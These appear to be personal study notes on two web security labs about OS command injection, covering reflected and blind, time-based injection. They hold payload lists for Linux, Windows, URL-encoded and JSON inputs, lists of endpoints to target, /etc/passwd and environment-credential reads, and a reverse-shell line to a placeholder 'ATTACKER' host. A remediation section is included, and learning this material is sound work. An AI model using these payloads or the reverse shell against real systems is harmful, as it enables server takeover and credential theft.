#Lab-1 🧨 OS Command Injection (Shell Injection)

---

## 🔹 Overview

OS Command Injection is a *critical server-side vulnerability* where an application executes operating system commands using *user-controlled input* without proper sanitization.

A successful exploit allows an attacker to:

- Run arbitrary system commands
- Read sensitive files
- Take full control of the server
- Pivot to internal systems

---

## 🔹 What Is This Topic?

> OS Command Injection occurs when user input is directly inserted into a system command (bash, sh, cmd, PowerShell) and executed by the OS.

This usually happens when developers:

- Use system(), exec(), shell_exec()
- Call shell scripts or OS binaries
- Trust user input for system-level operations

---

## 🔹 Lab Walkthrough (Your Solved Lab)

*Step-by-Step Exploitation*

### 1️⃣ Identify parameter passed to OS command

/stockStatus?productID=2&storeID=1

### 2️⃣ Test command injection separator

| whoami

### 3️⃣ Final payload
```
productID=2&storeID=1|whoami
```

### 4️⃣ Observe response

- Username printed in response


### 5️⃣ Submit username

- Lab solved ✅

---

## 🔹 Evidence

![command injection OS name](../images/osci-whoami.png)

---

## 🔹 Real-World Scenarios (OUT OF THE BOX)

### 1️⃣ Network Diagnostic Features (Most Common)

*Scenario:*  
A website allows users to test connectivity.

*Example Endpoint:*

/ping?host=8.8.8.8

*Backend Logic:*

ping -c 3 <user_input>

*Attacker Input:*

8.8.8.8 | whoami

*Impact:*
- Command execution
- Server user disclosure
- Easy RCE

---

### 2️⃣ Stock / Inventory Systems (Your Lab)

*Scenario:*  
Legacy system checks product availability.

*Backend:*

stockreport.pl productID storeID

*Attacker Input:*

productID=2&storeID=1|whoami

*Impact:*
- Arbitrary command execution
- Data exfiltration
- Full backend compromise

---

### 3️⃣ File Management Systems

*Scenario:*  
Admin panel reads logs or exports files.

*Endpoint:*

/download?file=report.txt

*Attacker Input:*

report.txt; id

*Impact:*
- File system access
- User enumeration
- Data leakage

---

### 4️⃣ Image / Media Processing

*Scenario:*  
Server resizes or converts images.

*Backend:*

convert <filename> -resize 200x200

*Attacker Input:*

image.jpg; whoami

*Impact:*
- RCE via image tools (ImageMagick, etc.)
- Very common in bug bounties

---

### 5️⃣ Backup / Maintenance Endpoints (HIGH RISK)

*Scenario:*  
Admin triggers backups or cleanup tasks.

*Endpoints:*

/backup /cleanup /run-task

*Attacker Input:*

backup && whoami

*Impact:*
- 🚨 Full server takeover
- 🚨 Often runs as root

---

### 6️⃣ URL Fetch / Import Features

*Scenario:*  
Application fetches data from user-provided URL.

*Endpoint:*

/fetch?url=http://example.com

*Attacker Input:*

http://test.com | whoami

*Impact:*
- RCE
- SSRF + OSCI combo

---

### 7️⃣ API Endpoints (JSON / XML)

*Scenario:*  
Backend processes system tasks via API.

*Payload:*
```json
{
  "host": "8.8.8.8; whoami"
}
```
*Impact:*
- Silent RCE
- Often overlooked by developers

---

## 🔹 High-Value Endpoints to Always Test

*🔥 Priority Targets*
```
/ping
/network-test
/status
/diagnostics
/backup
/restore
/cleanup
/convert
/resize
/export
/import
/fetch
/api/*
/admin/*
```

---

## 🔹 Universal Payloads (MEMORIZE)

*Linux / Unix*
```
; whoami
&& whoami
| whoami
$(whoami)
whoami
; sleep 5
```

*Windows*
```
& whoami
| whoami
&& whoami
```

---

## 🔹 Multi-Chain Attacks (REAL WORLD)

### 🔗 Chain 1: OSCI → File Read → Secrets

- OSCI → cat /etc/passwd

### 🔗 Chain 2: OSCI → Reverse Shell

- OSCI → bash -i >& /dev/tcp/ATTACKER/4444

### 🔗 Chain 3: OSCI → Credential Dump → Lateral Movement

- OSCI → env → DB creds → DB takeover

### 🔗 Chain 4: OSCI + SSRF

- URL fetch + shell execution → Internal network scan


---

3# 🔹 Impact (Why This Is CRITICAL)

- Full server compromise
- Database theft
- Credential leakage
- Lateral movement
- Supply-chain compromise
- Complete infrastructure takeover
- CVSS: Usually 9.8 – 10.0


---

## 🔹 Remediation (Defender View)

✅ Never pass user input to shell
✅ Use safe APIs instead of OS commands
✅ Whitelist input values
✅ Escape shell metacharacters
✅ Use parameterized commands
✅ Run services with least privilege
✅ Disable shell execution if not required

---

## 🔹 Extra Notes / Pro Tips

- Timing payload (sleep 5) = blind injection
- Output visible = easiest confirmation
- Always test |, ;, &&
- APIs are more vulnerable than UI
- Legacy code = high risk
- Admin tools = jackpot

---

# Lab-2 🧨 Blind OS Command Injection — Time-Based Attacks

---

## 1️⃣ Overview

Blind OS Command Injection occurs when:

- User input is passed to an operating system command
- The command *executes successfully*
- *BUT no command output is returned* in the HTTP response

In such cases, attackers confirm exploitation using *side effects*, most commonly:

- Time delays
- Network callbacks
- File creation
- System behavior changes

This is *extremely common in real-world production apps* and frequently missed.

---

## 2️⃣ What Is This Topic?

Blind OS Command Injection is about exploiting OS command execution *without visible output*.

> Output is hidden, but execution still happens.

Attackers rely on:

- sleep
- ping
- timeout
- DNS / HTTP callbacks

To *prove execution indirectly*.

---

## 4️⃣ Lab Walkthrough (Time-Based Confirmation)

1. Identify parameter passed to OS command (any input field that adds parameters in OS Command ,e.g: feedback form) 
2. No output is reflected in response (echo OS command failed) 
3. Output-based payloads fail  
4. Switch to time-based payload  
5. Inject command separator  (e.g: in feedback form in email parameter=xyz@gmail.com||ping -c 10 127.0.0.1||
6. Trigger delay using ping  
7. Confirm execution via response time  

> Execution confirmed *without any output*

---

## 5️⃣ Evidence (Time-Based Execution)

The following evidence shows successful blind OS command injection using a *10-second delay payload* with ping to localhost.

### 📸 Time Delay Confirmation

![ping time delay OS command](../images/blind-osci-ping-delay.png)

---

## 3️⃣ Real-World Scenarios (Attacker Mindset)

### 🔹 Scenario 1: Feedback / Contact Form (MOST COMMON)

*What the app wants:*
- User submits feedback
- Server sends email using OS command

*Example backend command:*

mail -s "feedback" admin@site.com

*Attacker payload (blind):*

test@test.com && ping -c 10 127.0.0.1

*How attacker confirms:*
- Page response delayed by ~10 seconds

*Impact:*
- Silent OS command execution
- Often escalates to full RCE

---

### 🔹 Scenario 2: Ping / Network Test Feature

*What the app wants:*
- Check if a host is reachable

*Backend command:*

ping <user_input>

*Attacker payload:*

127.0.0.1 | ping -c 10 127.0.0.1

*Observation:*
- Application hangs for 10 seconds

*Impact:*
- Confirmed OS command execution
- Internal pivoting possible

---

### 🔹 Scenario 3: URL Fetch / Webhook Tester

*What the app wants:*
- Fetch a user-supplied URL

*Backend command:*

curl <url>

*Payload:*

http://example.com; ping -c 10 127.0.0.1

*Confirmation:*
- Delayed response
- No output shown

*Impact:*
- Blind RCE
- Can chain with SSRF

---

### 🔹 Scenario 4: File Export / Report Generator

*What the app wants:*
- Generate and export reports

*Backend command:*

generate_report <filename>

*Payload:*

report.csv && ping -c 10 127.0.0.1

*Detection:*
- Export takes unusually long

*Impact:*
- Backend command execution
- Often runs with high privileges

---

### 🔹 Scenario 5: Image / Media Processing

*What the app wants:*
- Resize or convert images

*Backend command:*

convert input.jpg output.png

*Payload:*

image.jpg | ping -c 10 127.0.0.1

*Result:*
- Processing delay
- CPU spike

*Impact:*
- RCE via media pipelines

---

## 6️⃣ High-Value Endpoints to Always Test

/feedback /contact /ping /check-host /fetch /import-url /export /report /backup /maintenance /api/*

*High-risk parameters:*

email host ip url file name task

---

## 7️⃣ Multi-Chain Attack Possibilities

- Blind OSCI → Reverse shell
- Blind OSCI → Credential theft
- Blind OSCI → SSRF → Internal scan
- Blind OSCI → File write → Persistence
- Blind OSCI → Lateral movement

---

## 8️⃣ Remediation (Defender View)

- ❌ Never pass user input to shell
- ✅ Use safe system APIs
- ✅ Strict allowlists
- ✅ Proper argument escaping
- ✅ Disable dangerous OS tools
- ✅ Run services with least privilege

---

## 🔹 Universal OS Command Injection Payload Syntax (Must-Try Set)

> Use these payloads when testing OS command injection.
> At least ONE of them usually works depending on backend parsing.

---

### 🔸 Linux / Unix Payloads

#### Basic Command Chaining
```
- ; whoami
- && whoami
- | whoami
- || whoami
```
#### Command Substitution
```
- $(whoami)
- `` whoami ``
```
#### Time-Based (Blind OSCI)
```
- ; sleep 10
- && sleep 10
- | sleep 10
- || sleep 10
```
#### Network / Delay Alternative
```
- ; ping -c 10 127.0.0.1
- && ping -c 10 127.0.0.1
```
---

### 🔸 Windows Payloads

#### Basic Command Chaining
```
- & whoami
- && whoami
- | whoami
```
#### Time-Based (Blind OSCI)
```
- & timeout /t 10
- && timeout /t 10
- | timeout /t 10
```
---

### 🔸 URL-Encoded Variants (When Encoding Is Applied)
```
- %3B%20whoami
- %26%26%20whoami
- %7C%20whoami
- %3B%20sleep%2010
```
---

### 🔸 JSON / API Payload Example
```
{ "host": "8.8.8.8; sleep 10" }
```
---

### 🔸 Real-World Testing Rule

- Try *; first*
- If blocked → try &&
- If still blocked → try |
- If output hidden → switch to *sleep / ping*
- If UI blocks → test *API / JSON*

---


## 9️⃣ Extra Notes / Pro Tips

- Blind ≠ safe
- Time delay = execution proof
- Always try multiple separators:

; && || |

- Delays are the most reliable signal
- Real environments vary

---

## 🧠 One-Line Memory Hook

> If input reaches the OS and output is hidden — assume blind command injection.

---
